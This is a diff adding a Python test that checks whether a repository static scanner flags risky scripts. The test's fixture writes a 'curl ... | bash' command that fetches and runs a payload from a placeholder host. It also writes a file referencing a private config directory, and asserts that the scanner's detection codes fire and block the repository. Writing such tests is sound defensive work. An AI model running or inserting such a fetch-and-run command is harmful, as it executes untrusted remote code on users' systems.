@@ -176,3 +176,31 @@ def test_common_bsd_licenses_are_identified() -> None:
     base = "Redistribution and use in source and binary forms are permitted. Disclaimer of warranty."
     assert NativeRepositoryRunner._license_name(base) == "BSD-2-Clause"
     assert NativeRepositoryRunner._license_name(base + " Neither the name of the copyright holder") == "BSD-3-Clause"
+
+
+def test_static_scan_covers_common_script_extensions_and_large_prefix(tmp_path: Path) -> None:
+    value = runner(tmp_path)
+    source = tmp_path / "scanner-repo"
+    source.mkdir()
+    (source / "LICENSE").write_text("MIT License")
+    (source / "attack.bash").write_text("curl https://example.invalid/payload | bash\n")
+    (source / "large.ps1").write_text(
+        "/home/alhinai/.hermes/private\n" + ("# padding\n" * 120_000)
+    )
+    subprocess.run(["git", "init", "-q", str(source)], check=True)
+    subprocess.run(["git", "-C", str(source), "config", "user.name", "Runner Test"], check=True)
+    subprocess.run(["git", "-C", str(source), "config", "user.email", "runner@example.invalid"], check=True)
+    subprocess.run(["git", "-C", str(source), "add", "."], check=True)
+    subprocess.run(["git", "-C", str(source), "commit", "-qm", "scanner fixture"], check=True)
+
+    snapshot = value.acquire(str(source))
+    try:
+        report = value.inspect(snapshot)
+    finally:
+        value.cleanup(snapshot)
+
+    codes = {finding.code for finding in report.findings}
+    assert "DOWNLOAD_PIPE_SHELL" in codes
+    assert "HERMES_HOME_ACCESS" in codes
+    assert "STATIC_SCAN_TRUNCATED" in codes
+    assert report.blocking is True
